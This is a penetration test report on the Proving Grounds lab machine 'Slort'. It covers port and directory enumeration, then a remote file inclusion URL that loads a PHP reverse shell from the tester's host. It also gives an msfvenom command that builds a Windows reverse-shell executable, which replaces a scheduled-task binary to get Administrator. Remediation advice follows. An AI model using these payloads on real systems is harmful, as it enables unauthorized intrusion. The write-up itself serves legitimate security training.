# PG Practice Slort - Penetration Test Report

**Target:** Slort (Proving Grounds Practice)

**Target IP:** 192.168.222.53

**Date:** September 19, 2025

**Tester:** randalltr

---

## 1. Objective

The objective of this penetration test was to assess the security postere of the target system, identify vulnerabilities, and exploit them to gain unauthorized access. The end goal was to escalate privileges to the highest level possible and retrieve the proof files (`local.txt` and `proof.txt`).

---

## 2. Tools Used

- nmap - port scanning & service enumeration
- gobuster - directory brute-forcing
- msfvenom - payload generation
- python3 -m http.server - file hosting
- netcat - reverse shell listener

---

## 3. Methodology & Findings

### 3.1 Reconnaissance

Initial scanning of the target was performed using `nmap`:

```
nmap -sCV 192.168.222.53
```

**Findings:**

- Multiple ports open
- HTTP services running on 4443 and 8080
- Both ports served the XAMPP default page

---

### 3.2 Directory Enumeration

A directory brute-force scan was run on port 4443:

```
gobuster dir -u http://192.168.222.53.4443 -w /usr/share/wordlists/dirbuster/directory-list-2.3-medium.txt -x php
```

**Findings:**

- `/site` was discovered
- Visiting `/site` redirected to: `http://192.168.222.53:4443/site/index.php?page=main.php`
  The `page` parameter suggests a **file inclusion vulnerability**.

---

### 3.3 Exploitation - Initial Access

To confirm **Remote File Inclusion (RFI)** a `PHP Ivan Sincek` file (`php-rev-shell.php`) was created using `revshells.com`.

It was hosted locally with:

```
python3 -m http.server 80
```

Requesting the payload via:

```
http://192.168.222.53:4443/site/index.php?page=http://192.168.45.172/php-rev-shell.php
```

**Result:** Executed successfully on the target -> confirmed **RFI vulnerability** -> yielding a **low-privilege shell** on the target.

---

### 3.4 Privilege Escalation - Scheduled Task Abuse

Enumeration revealed a directory:

```
C:\Backup
```

Inside, `info.txt` indicated a scheduled task executed `C:\Backup\TFTP.exe` every 5 minutes.

**Key Finding:**
The tester had **Full Control** permissions on both `C:\Backup` and `TFTP.exe`.

---

### 3.5 Privilege Escalation - Exploit

A malicious binary was created with `msfvenom`:

```
msfvenom -p windows/x64/shell_reverse_tcp LHOST=192.168.45.172 LPORT=1337 -f exe -o rev.exe
```

This replaced the legitimate `TFTP.exe` in `C:\Backup`.

A listener was started:

```
rlwrap -cAr nc -lnvp 1337
```

After 5 minutes, the scheduled task executed the payload, and a reverse shell was received.

**Privilege Escalation Successful:** Shell obtained as **Slort\Administrator**.

---

## 4. Proof of Exploitation

### Local.txt

```
local.txt: [redacted for PG compliance]
```

### Proof.txt

```
proof.txt: [redacted for PG compliance]
```

---

## 5. Remediation Recommendations

### 1. Disable Remote File Inclusion (RFI):

- Restrict `include()` and `require()` functions from accepting external input.
- Use whitelists for file inclusion.

### 2. Patch Web Application:

- Sanitize all user input.
- Implement parameterized file loading.

### 3. Restrict Scheduled Tasks:

- Ensure critical executables in `C:\Backup` are not writable by low-privileged users.
- Apply least-privilege permissions.

### 4. General Hardening:

- Regular patching of web services.
- Segregation of duties and accounts.
- Continuous monitoring of scheduled tasks and privilege assignments.

---

# Conclusion

The **Slort** machine was successfully compromised through a **Remote File Inclusion (RFI) vulnerability**. Privilege escalation was achieved by **abusing a writable scheduled task binary**, ultimately resulting in full **Administrator access**.

The attack highlights the importance of secure coding practices, principle of least privilege, and routine system hardening.
